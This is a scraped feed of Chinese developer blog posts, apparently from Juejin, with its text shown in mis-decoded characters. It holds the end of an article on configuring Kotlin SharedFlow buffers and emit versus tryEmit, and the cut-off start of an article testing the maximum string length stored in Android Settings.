<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39537a2e998549b1a60a0eb0ca681966~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=I863%2FmBosj4SBgoN1ELAWx4hOxM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">äºŒã€è®¢é˜…å‰åçš„è¡Œä¸ºå·®å¼‚</h3>
<h4 data-id="heading-4">2.1 æ— è®¢é˜…è€…æ—¶çš„è¡Œä¸ºè¡¨ç°</h4>
<p>æ ¸å¿ƒç»“è®ºï¼š åœ¨æ²¡æœ‰æ”¶é›†è€…ï¼ˆcollectorï¼‰æ—¶ï¼Œreplay ç¼“å­˜ä»ç„¶å·¥ä½œï¼Œè€Œ extraBufferCapacity åŸºæœ¬æ— æ•ˆã€‚</p>
<p>åœºæ™¯åˆ†æï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cce2d7a3ae844e5692feb0e30121859e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=ojH1RlQojEh1LWd%2B8I6xH535eeY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c489e50f90245bb8c43d75bf683db5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=xTrr6%2BK8GJqoDS68KGqD2v5M9ts%3D" alt="image.png" loading="lazy"/></p>
<p>å…³é”®ï¼š</p>
<p>Â· replay æ˜¯æŒä¹…æ€§ç¼“å­˜ï¼Œæ— è®ºæ˜¯å¦æœ‰è®¢é˜…è€…éƒ½ä¼šä¿ç•™
Â· extraBufferCapacity æ˜¯ä¸´æ—¶æ€§ç¼“å†²åŒºï¼Œåªåœ¨æœ‰è®¢é˜…è€…æ—¶ç”Ÿæ•ˆ
Â· æ²¡æœ‰è®¢é˜…è€…æ—¶ï¼Œæ€»ç¼“å†²åŒºå¤§å° = replay</p>
<h4 data-id="heading-5">2.2 æœ‰è®¢é˜…è€…æ—¶çš„è¡Œä¸ºè¡¨ç°</h4>
<p>æ ¸å¿ƒç»“è®ºï¼š å½“æœ‰æ´»è·ƒè®¢é˜…è€…æ—¶ï¼Œæ€»ç¼“å†²åŒºå¤§å° = replay + extraBufferCapacityã€‚</p>
<p>è¡Œä¸ºå¯¹æ¯”è¡¨ï¼š</p>
<p>åœºæ™¯ replay è¡¨ç° extraBufferCapacity è¡¨ç° onBufferOverflow è§¦å‘æ¡ä»¶
æ— è®¢é˜…è€… âœ… æŒç»­å·¥ä½œ âŒ ä¸ç”Ÿæ•ˆ ä»…å½“ replay ç¼“å­˜æ»¡æ—¶
æœ‰è®¢é˜…è€… âœ… æ–°è®¢é˜…è€…æ”¶åˆ°å†å²å€¼ âœ… å¤„ç†èƒŒå‹ï¼ˆå‘å°„&gt;æ”¶é›†ï¼‰ æ€»ç¼“å†²åŒºæ»¡æ—¶</p>
<p>ç¤ºä¾‹è¯´æ˜ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf68c8e72de74a21a171f9d62bee028b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=02YS7NmrZGxMI4cUz8sZjmOcBR0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">ä¸‰ã€emit vs tryEmit çš„æ·±åº¦å¯¹æ¯”</h3>
<h4 data-id="heading-7">3.1 è¡Œä¸ºå·®å¼‚çŸ©é˜µ</h4>








































<table><thead><tr><th>ç¼“å†²åŒºçŠ¶æ€</th><th>BufferOverflow ç­–ç•¥</th><th>emit() è¡Œä¸º</th><th>tryEmit() è¡Œä¸º</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td>æœ‰ç©ºé—´</td><td>ä»»æ„</td><td>ç«‹å³å‘å°„</td><td>ç«‹å³å‘å°„</td><td>true</td></tr><tr><td>å·²æ»¡</td><td>SUSPEND</td><td>æŒ‚èµ·ç­‰å¾…</td><td>ç«‹å³å¤±è´¥</td><td>false</td></tr><tr><td>å·²æ»¡</td><td>DROP_OLDEST</td><td>ä¸¢å¼ƒæœ€æ—§å€¼å¹¶å‘å°„</td><td>ä¸¢å¼ƒæœ€æ—§å€¼å¹¶å‘å°„</td><td>true</td></tr><tr><td>å·²æ»¡</td><td>DROP_LATEST</td><td>ä¸¢å¼ƒå½“å‰å€¼å¹¶ç»§ç»­</td><td>ä¸¢å¼ƒå½“å‰å€¼å¹¶ç»§ç»­</td><td>true</td></tr></tbody></table>
<h4 data-id="heading-8">3.2 å…³é”®å·®å¼‚ç‚¹</h4>
<h5 data-id="heading-9">å·®å¼‚1ï¼šæŒ‚èµ· vs éæŒ‚èµ·</h5>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d3276dd3c65479eb4ed9df7293a620b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=Wrwg5KbrRx2kUHDAeel6ieAJLoM%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-10">å·®å¼‚2ï¼šSUSPEND ç­–ç•¥ä¸‹çš„è¡¨ç°</h5>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3ae77b2b0c349d190ab7f9ba45bcb2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=q38rfMnhja%2Fk1LOCHzsrPduFDjI%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-11">å·®å¼‚3ï¼šDROP_OLDEST ç­–ç•¥ä¸‹çš„ç‰¹æ®Šæ€§</h5>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70ff3ada295545b29ed44d758761e037~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=88jCNUbn5549g%2BKDMyBKSXQRi%2BA%3D" alt="image.png" loading="lazy"/></p>
<p>å½“ onBufferOverflow = DROP_OLDEST æ—¶ï¼Œè¢«ä¸¢å¼ƒçš„å¯èƒ½æ˜¯ replay ç¼“å­˜ä¸­çš„å€¼ï¼Œè¿™æ„å‘³ç€æ–°è®¢é˜…è€…æ— æ³•è·å¾—å®Œæ•´çš„å†å²è®°å½•ã€‚</p>
<h3 data-id="heading-12">å››ã€å®æˆ˜é…ç½®æŒ‡å—</h3>
<h4 data-id="heading-13">4.1 åœºæ™¯ä¸€ï¼šçŠ¶æ€ç®¡ç†ï¼ˆStateFlow æ›¿ä»£ï¼‰</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bc963ad99b940e9b36dcf6e6f4e15d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=TwIvI9RavLtrmtULP%2B%2FX0O0ek1k%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-14">4.2 åœºæ™¯äºŒï¼šäº‹ä»¶æ€»çº¿ï¼ˆå•æ¬¡äº‹ä»¶ï¼‰</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/844b838c0c934e46a7aab2eb1ccb956f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=fXKZzCfjv6aS6e03i1emUnpFcz0%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-15">4.3 åœºæ™¯ä¸‰ï¼šé«˜é¢‘ç‡æ•°æ®æµï¼ˆä¼ æ„Ÿå™¨æ•°æ®ï¼‰</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdd9defcdf3c40ad8459deff74292b6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=24ObMD5xEe%2BTCCE%2B7ZEiUIdJNGE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-16">4.4 åœºæ™¯å››ï¼šå®æ—¶èŠå¤©æ¶ˆæ¯</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/440b922c1db04d1883fb427d740f956d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585885&amp;x-signature=hMZ8fqYmtz0WpFSRhUE6cFX9d%2B0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-17">äº”ã€æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<h4 data-id="heading-18">1. åˆç†è®¾ç½® replay å¤§å°</h4>
<ul>
<li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼š<code>replay = 1</code></li>
<li><strong>äº‹ä»¶æ€»çº¿</strong>ï¼š<code>replay = 0</code></li>
<li><strong>å®æ—¶æ•°æ®</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€è¦è®¾ç½®</li>
</ul>
<h4 data-id="heading-19">2. é€‰æ‹©åˆé€‚çš„æº¢å‡ºç­–ç•¥</h4>
<ul>
<li><strong>å…³é”®æ•°æ®</strong>ï¼š<code>SUSPEND</code>ï¼ˆä¸ä¸¢å¤±ï¼‰</li>
<li><strong>å®æ—¶æ•°æ®</strong>ï¼š<code>DROP_OLDEST</code>ï¼ˆä¸é˜»å¡ï¼‰</li>
<li><strong>æœ€æ–°æ•°æ®ä¼˜å…ˆ</strong>ï¼š<code>DROP_LATEST</code></li>
</ul>
<h4 data-id="heading-20">3. æ ¹æ®åœºæ™¯æ¥é…ç½®</h4>















































<table><thead><tr><th>é…ç½®é¡¹</th><th>åœºæ™¯</th><th>æ¨èå€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>replay</strong></td><td>çŠ¶æ€ç®¡ç†</td><td>1</td><td>æ–°è®¢é˜…è€…è·å–æœ€æ–°çŠ¶æ€</td></tr><tr><td><strong>replay</strong></td><td>äº‹ä»¶æ€»çº¿</td><td>0</td><td>ä¸€æ¬¡æ€§äº‹ä»¶ï¼Œä¸é‡æ”¾å†å²</td></tr><tr><td><strong>replay</strong></td><td>å®æ—¶æ•°æ®</td><td>ä¸šåŠ¡å†³å®š</td><td>æŒ‰éœ€è®¾ç½®å†å²æ•°æ®é‡</td></tr><tr><td><strong>æº¢å‡ºç­–ç•¥</strong></td><td>å…³é”®æ•°æ®</td><td>SUSPEND</td><td>ç¡®ä¿æ•°æ®ä¸ä¸¢å¤±</td></tr><tr><td><strong>æº¢å‡ºç­–ç•¥</strong></td><td>å®æ—¶æ•°æ®</td><td>DROP_OLDEST</td><td>é¿å…é˜»å¡ç”Ÿäº§è€…</td></tr><tr><td><strong>æº¢å‡ºç­–ç•¥</strong></td><td>æœ€æ–°æ•°æ®ä¼˜å…ˆ</td><td>DROP_LATEST</td><td>ä¸¢å¼ƒå½“å‰ï¼Œä¿ç•™å†å²</td></tr></tbody></table>
<h3 data-id="heading-21">æ€»ç»“</h3>
<p>æ ¸å¿ƒè¦ç‚¹å›é¡¾ï¼š</p>
<h4 data-id="heading-22">1. replayï¼šæ°¸ä¹…æ€§å†å²ç¼“å­˜ï¼Œå³ä½¿æ— è®¢é˜…è€…ä¹Ÿä¿ç•™</h4>
<h4 data-id="heading-23">2. extraBufferCapacityï¼šä¸´æ—¶æ€§ç¼“å†²åŒºï¼Œåªåœ¨æœ‰è®¢é˜…è€…æ—¶ç”Ÿæ•ˆ</h4>
<h4 data-id="heading-24">3. onBufferOverflowï¼šå†³å®šèƒŒå‹å¤„ç†ç­–ç•¥</h4>
<h4 data-id="heading-25">4. emit vs tryEmitï¼šå‰è€…å¯èƒ½æŒ‚èµ·ï¼Œåè€…ç«‹å³è¿”å›</h4>
<p>é»„é‡‘é…ç½®æ³•åˆ™ï¼š</p>













































<table><thead><tr><th>åº”ç”¨åœºæ™¯</th><th>replay</th><th>extraBufferCapacity</th><th>onBufferOverflow</th><th>å‘å°„æ–¹å¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>çŠ¶æ€ç®¡ç†</strong></td><td>1</td><td>0</td><td><code>DROP_OLDEST</code></td><td><code>tryEmit()</code></td><td>åªéœ€æœ€æ–°çŠ¶æ€ï¼Œå…è®¸ä¸¢å¼ƒæ—§å€¼</td></tr><tr><td><strong>äº‹ä»¶æ€»çº¿</strong></td><td>0</td><td>64+</td><td><code>SUSPEND</code></td><td><code>emit()</code></td><td>äº‹ä»¶ä¸èƒ½ä¸¢å¤±ï¼Œéœ€ç¡®ä¿é€è¾¾</td></tr><tr><td><strong>é«˜é¢‘æ•°æ®</strong></td><td>0</td><td>æ ¹æ®é€Ÿåº¦å·®è°ƒæ•´</td><td><code>DROP_OLDEST</code></td><td><code>tryEmit()</code></td><td>å®å¯ä¸¢æ•°æ®ä¹Ÿä¸é˜»å¡ç”Ÿäº§è€…</td></tr><tr><td><strong>å®æ—¶èŠå¤©</strong></td><td>20-50</td><td>10-20</td><td><code>SUSPEND</code></td><td><code>emit()</code></td><td>æ¶ˆæ¯ä¸èƒ½ä¸¢å¤±ï¼Œæ–°ç”¨æˆ·çœ‹å†å²</td></tr></tbody></table>
<p>æœ€åå»ºè®®ï¼š</p>
<ol>
<li>å§‹ç»ˆè€ƒè™‘å†…å­˜ï¼šåˆç†è®¾ç½® replay å¤§å°ï¼Œé¿å…ç¼“å­˜å¤§é‡æ•°æ®</li>
<li>æ ¹æ®ä¸šåŠ¡é€‰æ‹©ç­–ç•¥ï¼šå…³é”®æ•°æ®ç”¨ SUSPENDï¼Œå¯ä¸¢å¤±æ•°æ®ç”¨ DROP_OLDEST</li>
<li>æµ‹è¯•èƒŒå‹åœºæ™¯ï¼šç¡®ä¿åœ¨é«˜è´Ÿè½½ä¸‹ç³»ç»Ÿè¡Œä¸ºç¬¦åˆé¢„æœŸ</li>
</ol>
<p>é€šè¿‡åˆç†é…ç½®è¿™ä¸‰ä¸ªå‚æ•°ï¼Œå¯ä»¥æ„å»ºå‡ºé«˜æ•ˆã€ç¨³å®šã€ç¬¦åˆä¸šåŠ¡éœ€æ±‚çš„å“åº”å¼æ•°æ®æµç³»ç»Ÿã€‚æ²¡æœ‰"ä¸€åˆ€åˆ‡"çš„æœ€ä½³é…ç½®ï¼Œåªæœ‰æœ€é€‚åˆå…·ä½“åœºæ™¯çš„é…ç½®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®‰å“Settingså€¼åŸç†æºç å‰–æå­˜å‚¨æœ€å¤§çš„å­—ç¬¦æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7588711557499945010</link>    <guid>https://juejin.cn/post/7588711557499945010</guid>    <pubDate>2025-12-29T04:22:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588711557499945010" data-draft-id="7588799600165666826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®‰å“Settingså€¼åŸç†æºç å‰–æå­˜å‚¨æœ€å¤§çš„å­—ç¬¦æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T04:22:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·8127482815120"/> <meta itemprop="url" content="https://juejin.cn/user/2711830721731422"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®‰å“Settingså€¼åŸç†æºç å‰–æå­˜å‚¨æœ€å¤§çš„å­—ç¬¦æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2711830721731422/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·8127482815120
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:22:55.000Z" title="Mon Dec 29 2025 04:22:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯ï¼š</h2>
<p>å¹³å¸¸åšromç›¸å…³å¼€å‘æ—¶å€™ç»å¸¸éœ€è¦ä¸settingså€¼æ‰“äº¤é“ï¼Œéœ€è¦ç‹¬ç«‹æˆ–è€…å­˜å‚¨ä¸€ä¸ªsettingsçš„åœºæ™¯ï¼Œç¾¤é‡Œæœ‰ä¸ªå­¦å‘˜æœ‹å‹å°±é—®äº†ä¸€ä¸ªç–‘é—®ï¼Œé‚£å°±æ˜¯Settingsçš„putStringæ–¹å¼æ¥å­˜å‚¨å­—ç¬¦ï¼Œé‚£ä¹ˆå¯ä»¥å­˜å‚¨çš„æœ€å¤§å­—ç¬¦æ˜¯å¤šå°‘å‘¢ï¼Ÿé’ˆå¯¹è¿™ä¸ªé—®é¢˜æˆ‘ä»¬æ¥å‰–æä¸€ä¸‹Settingå€¼å­˜å‚¨æœ€å¤§å­—ç¬¦æ˜¯å¤šå°‘ä¸ªã€‚</p>
<h2 data-id="heading-1">Settingsæ•°æ®å­˜æ”¾çš„å˜åŒ–ï¼š</h2>
<p>Googleä¿®æ”¹äº†SettingsProviderï¼Œæ¶‰åŠåˆ°äº†global,secure,system ä¸‰ä¸ªè¡¨ï¼›å¹¶ä¸”å®ç°æ–¹å¼ä»ä¹‹å‰çš„æ•°æ®åº“ï¼Œæ”¹ä¸ºå¼‚æ­¥æ€§èƒ½æ›´åŠ ä¼˜è‰¯çš„xmlï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„ä¸€ä»½SettingsProviderè®¾ç½®xmlæ–‡æ¡£ã€‚é€šå¸¸ä½äº
/data/system/users/userid/ ä¸‹é¢ï¼Œå…·ä½“å¦‚ä¸‹å›¾ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27eeaf8326e64aae89935a52e66ee4b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=x3aKOFxjgAu%2BYy0AmQo3UZPPCe8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>ä½†æ˜¯ç›´æ¥çœ‹æ˜¯ä¸€èˆ¬ä¹±ç ï¼Œè¿™ä¸ªå› ä¸ºæ˜¯äºŒè¿›åˆ¶çš„xmlã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe73f42c7faa483887e3ef6731242ab4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=3dZKlMJ2Ir%2Fl4XRS1HoS5aKSg4s%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>å‚è€ƒè¿™ä¸ªæ–‡ç« ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">abx2xml settings_global.xml settings_global-read.xml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29385d8acd84994a05f7276009b9e60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=6QACC6Y%2BtN7L%2BgGvx6KbxOqEczI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-2">æµ‹è¯•Settingå†™å…¥å¤§é‡æ•°æ®</h2>
<p>ä¸‹é¢å°±å‡†å¤‡ä¸€ä¸ªå¤§çš„å­—ç¬¦ä¸²ç„¶åå†™å…¥settingsçš„è°ƒç”¨</p>
<pre><code class="hljs language-cpp" lang="cpp">   StringBuffer stringBuffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">StringBuffer</span>();
	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">75536</span>;i++) {
		stringBuffer.<span class="hljs-built_in">append</span>(<span class="hljs-string">'b'</span>);
	}  
	Settings.Global.<span class="hljs-built_in">putString</span>(decorView.<span class="hljs-built_in">getContext</span>().<span class="hljs-built_in">getContentResolver</span>(),<span class="hljs-string">"key_max1"</span>,stringBuffer.<span class="hljs-built_in">toString</span>());
</code></pre>
<p>å†™å…¥åå¯ä»¥é€šè¿‡æŸ¥çœ‹æ—¥å¿—æ–¹å¼ï¼Œçœ‹çœ‹ æ˜¯å¦æœ‰å¼‚å¸¸ã€‚</p>
<p>ç»“æœçœŸçš„åœ¨æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°äº§ç”Ÿäº†å¦‚ä¸‹å¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">09-19 00:14:55.127   524   598 E SettingsState: Failed to write settings, restoring backup
09-19 00:14:55.127   524   598 E SettingsState: java.io.IOException: Modified UTF-8 length too large: -75536
09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.internal.util.ArtFastDataOutput.writeUTF(ArtFastDataOutput.java:85)
09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.modules.utils.BinaryXmlSerializer.attribute(BinaryXmlSerializer.java:207)
